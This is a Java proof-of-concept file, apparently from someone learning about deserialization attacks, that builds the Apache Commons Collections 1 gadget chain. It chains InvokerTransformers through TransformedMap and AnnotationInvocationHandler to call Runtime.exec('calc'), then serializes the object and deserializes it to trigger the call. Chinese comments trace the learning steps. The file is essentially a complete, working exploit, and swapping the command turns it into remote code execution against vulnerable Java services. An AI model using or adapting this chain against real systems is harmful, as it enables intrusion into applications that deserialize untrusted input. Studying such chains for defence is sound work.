package com.melll;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC1β {
    public static void main(String[] args) throws Exception{
//        Runtime.getRuntime().exec("calc");
//        //普通反射 调用 Runtime
//        Runtime runtime = Runtime.getRuntime();
//        Class<?> c = Runtime.class;
//        Method execMethod = c.getMethod("exec", String.class);
//        execMethod.invoke(runtime,"calc");
        //InvokerTransformer 调用
        //        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class},new Object[]{"calc"});
            //反射获取Runtime实例
//        Class c = Runtime.class;
//        Method getRuntimeMethod = c.getMethod("getRuntime", null);
//        Runtime runtime = (Runtime) getRuntimeMethod.invoke(null,null);
//        Method execMethod = c.getMethod("exec", String.class);
//        execMethod.invoke(runtime,"calc");
        //->改写成InvokerTransformer调用
//        Method getRuntimeMethod =(Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);
//        Runtime runtime = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod);
//        new InvokerTransformer("exec", new Class[]{String.class},new Object[]{"calc"}).transform(runtime);
        Transformer[] Transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(Transformers);
        //cc1
        HashMap<Object,Object> map = new HashMap<Object,Object>();
        map.put("toString","toString");
        Map<Object,Object> Transformedmap = TransformedMap.decorate(map, null, chainedTransformer);
//        for (Map.Entry entry:Transformedmap.entrySet()){
//            entry.setValue(runtime);
//        }
        Class annotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = annotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        Object obj = annotationInvocationHandlerConstructor.newInstance(Target.class,Transformedmap);
        serialize(obj);
        unsserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException{
        ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get("ser.bin")));
        oos.writeObject(obj);
    }
    public static Object unsserialize(String Filename) throws IOException,ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(Files.newInputStream(Paths.get(Filename)));
        return ois.readObject();

    }
}
